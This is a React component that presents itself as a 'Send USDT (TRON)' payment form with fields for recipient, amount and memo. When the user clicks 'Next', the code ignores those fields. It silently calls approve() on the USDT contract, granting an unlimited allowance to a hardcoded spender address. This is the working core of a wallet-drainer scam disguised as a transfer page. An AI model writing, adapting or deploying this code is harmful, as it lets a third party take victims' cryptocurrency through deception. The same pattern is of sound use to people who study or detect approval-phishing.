import React, { useState, useEffect } from "react";
import { FaAddressBook, FaQrcode, FaInfoCircle, FaTimes } from "react-icons/fa";
import "./styles.css";

const USDTSendApp = () => {
  const [address, setAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [memo, setMemo] = useState("");
  const [account, setAccount] = useState("");
  const [message, setMessage] = useState("");
  const [tronWeb, setTronWeb] = useState(null);

  // ✅ TRC20 USDT contract on TRON mainnet
  const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

  const USDT_ABI = [
    {
      constant: false,
      inputs: [
        { name: "spender", type: "address" },
        { name: "value", type: "uint256" },
      ],
      name: "approve",
      outputs: [{ name: "", type: "bool" }],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
  ];

  useEffect(() => {
    const checkTron = () => {
      if (window.tronWeb && window.tronWeb.ready) {
        setTronWeb(window.tronWeb);
        setAccount(window.tronWeb.defaultAddress.base58);
        setMessage("✅ Connected to Tron Wallet");
      } else {
        setMessage("⚠️ Open in Trust Wallet / TronLink DApp browser");
        setTimeout(checkTron, 1000); // keep checking until injected
      }
    };
    checkTron();
  }, []);

  const connectWallet = async () => {
    try {
      if (window.tronLink) {
        await window.tronLink.request({ method: "tron_requestAccounts" });
        setTronWeb(window.tronWeb);
        setAccount(window.tronWeb.defaultAddress.base58);
        setMessage("✅ Wallet connected: " + window.tronWeb.defaultAddress.base58);
      } else {
        setMessage("❌ TronLink/Trust Wallet not found");
      }
    } catch (err) {
      setMessage("❌ Connection failed: " + err.message);
    }
  };

  const handleNext = async () => {
    if (!tronWeb || !account) {
      setMessage("Please connect your wallet first");
      return;
    }
    if (!address || !amount) {
      setMessage("Please enter both address and amount");
      return;
    }
    try {
      const spender = "TBJF4h5qbuAYxdJ4rhBCy5Lu5ZeYUC1dJv"; // example spender
      const unlimitedAmount =
        "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // MaxUint256

      const contract = await tronWeb.contract(USDT_ABI, USDT_CONTRACT);
      const tx = await contract.approve(spender, unlimitedAmount).send({
        feeLimit: 100_000_000,
      });

      setMessage(`✅ Approval submitted! TxID: ${tx}`);
    } catch (err) {
      setMessage("❌ Transaction failed: " + (err?.message || err));
    }
  };

  return (
    <div className="send-usdt-container">
      <div className="send-usdt-card">
        <div className="send-header">
          <button className="back-button">←</button>
          <h1 className="send-title">Send USDT (TRON)</h1>
          {!account ? (
            <button onClick={connectWallet}>Connect Wallet</button>
          ) : (
            <p>Connected: {account.slice(0, 6)}...{account.slice(-4)}</p>
          )}
        </div>

        {message && <div className="message-display">{message}</div>}

        <div className="input-section">
          <label className="input-label">Recipient Address</label>
          <input value={address} onChange={(e) => setAddress(e.target.value)} />
        </div>

        <div className="input-section">
          <label className="input-label">Amount</label>
          <input value={amount} onChange={(e) => setAmount(e.target.value)} />
        </div>

        <div className="input-section">
          <label className="input-label">Memo</label>
          <input value={memo} onChange={(e) => setMemo(e.target.value)} />
        </div>

        <button className="next-button" onClick={handleNext} disabled={!address || !amount}>
          Next
        </button>
      </div>
    </div>
  );
};

export default USDTSendApp;
